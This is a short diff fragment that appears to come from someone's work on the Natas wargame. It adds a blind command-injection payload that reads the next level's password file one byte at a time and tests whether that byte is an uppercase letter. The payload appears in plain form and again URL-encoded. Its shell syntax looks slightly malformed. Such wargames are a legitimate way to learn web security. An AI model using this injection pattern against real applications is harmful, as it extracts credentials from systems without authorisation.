@@ -1,0 +1,8 @@
+
+    [$(if[[(dd bs=1 count=1 skip=2 if=/etc/natas_webpass/natas17)=~ [A-Z]]]
+then
+echo .
+fi ) ]
+    
+%0A%20%20%20%20%5B%24(if%5B%5B(dd%20bs%3D1%20count%3D1%20skip%3D2%20if%3D%2Fetc%2Fnatas_webpass%2Fnatas17)%3D~%20%5BA-Z%5D%5D%5D%0Athen%0Aecho%20.%0Afi%20)%20%5D%0A%20%20%20%20
+0
